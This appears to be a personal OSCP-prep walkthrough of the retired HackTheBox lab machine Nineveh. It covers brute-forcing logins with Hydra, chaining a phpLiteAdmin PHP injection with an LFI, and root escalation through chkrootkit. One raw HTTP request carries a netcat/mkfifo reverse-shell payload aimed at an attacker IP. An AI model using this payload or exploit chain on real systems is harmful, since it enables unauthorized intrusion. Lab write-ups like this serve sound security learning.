# Nineveh Walkthrough
Name: Nineveh
Date:  
Difficulty:  Medium
Goals:  OSCP Prep
Learnt:
- php://filter/convert.base64encode/resources= 
- Thinking about how to Chaining Exploits
- Different password lists although most of these CTFs are older and brute forcing logins is kind of frowned upon. It has still come up in PG boxes.

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Nineveh/Screenshots/ping.png)

Nikto find info.php
![](phpinfoinnikto.png)
There is also domain name found by nmap:
![](vhosts.png)

![](blogworxdb.png)

7.0.18-0ubuntu0.16.04.1  
OpenSSL 1.0.2g 1 Mar 2016
PCRE Library Version 8.38 2015-11-23
  
www-data user and group
/etc/php/7.0/apache2

SSL /TLS everything points towards a certificate attack. Man in the middling myself to exfiltrate data somehow.


![](comments.png)

- BIG FAIL!
Login page is NOT fixed! - Hydra reports all passwords work, usernames admin and amrois

admin
amrois

https://nineveh.htb/db/
![](phpliteadmin.png)
admin:admin - does not work

Also error with ssl cert...

## Exploit

![](multipleVulnsforphpliteadmin.png)

![](hydrathelitephpadmin.png)

![](shellinsqlite.png)

RCE requires [creds](https://www.exploit-db.com/exploits/24044), wso with `admin : password123`; this is a better explaination: [masood](https://github.com/F-Masood/PHPLiteAdmin-1.9.3---Exploit-PoC) ... [Multiple](https://www.exploit-db.com/exploits/39714) does not contain a file inclusion. Given that I had issues with hydra on the https page, trying the same password for admin did not work. Returning back to the previous login at /department/login.php. As this brute forcing of a login page is neither fun and is spoiling my learning I watched the Ippsec video for this part to check seeing I would just be brute forcing password lists. admin

![](lfiwearelookingfor.png)

![](lfibreak.png)

![](lfibreaktwo.png)

I am not a php person, went back to the [Ippsec video](https://www.youtube.com/watch?v=K9DKULxSBK4) after and hour of trying LFI and reviewing. I learnt about the `php://filter`, but also that I was suppose to assume from the ninevehNotes mispelt as same: "ninvehNotes" even though it would produce a "No Note selected" was that I need to rename my sql table to ninevehNotes.php.

![900](ninevehNotesninevehNotes.png)

Code execution! Then I failed for half an hour to make that work so something went wrong. And with time constraits I have it left it here.

I then returned complete this briefly summarising everything. I gained access to phpmyadmin page which you can make sqlite databases, which the version of phpmyadmin has vulnerablity for remote php injection. While on the /department/manage.php has a lfi where the `notes=` parameter can the be given an argument to a file that has to be ninevehNotes.x file due to filtering rules with php `include()`. Reviewing what I had done and notes instead of `$_REQUEST` I used `$_GET`. And without `echo`!

 `$_REQUEST` An associative array that by default contains the contents of [`$_GET`](https://www.php.net/manual/en/reserved.variables.get.php), [`$_POST`](https://www.php.net/manual/en/reserved.variables.post.php)  and [`$_COOKIE`](https://www.php.net/manual/en/reserved.variables.cookies.php). Whereas `$_GET` An associative array of variables passed to the current script via the URL parameters (aka. query string). Note that the array is not only populated for GET requests, but rather for all requests with a query string. I also put it in the default value as suggested by the github article. 

Lessons learnt
1. Swap test swapping the fields, do not give up
2. Chaining exploits note
	1. Server Language
	2. Exploit A does X
		1. It reads a file
			1. How  - not in the sense of permissions but - rules about what it can read
	3. Exploit B doex Y
		1. Injects Code - Server is vulnerable - the concern is more in how A gets to B
			1. Where -> LFI includes a file, there need a path.
	4. As A can interact with B, what elements of A are required to make B accessable
	5. Use of symbols FOR BOTH! 
3. Spelling mistakes are faceslap

![](spellmistakesarebad.png)

I did the best bash reverse shell

```
GET /department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.109+33333+>/tmp/f+ HTTP/1.1
Host: 10.129.4.245
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=drnitsgevbtpi4e8kq5uc273b3
Connection: close

```

![](reverseshell.png)

![](rootlikechkrootkits.png)

I have covid and my stomach aches. I read about chkrootkit for pwk 103. It was all in front of me.depa
```bash
searchsploit chkrootkit
```

TL;DR:

chkrootkits will execute `/tmp/update` as the function slapper should be `/tmp/.update`

![](preroot.png)
![](root.png)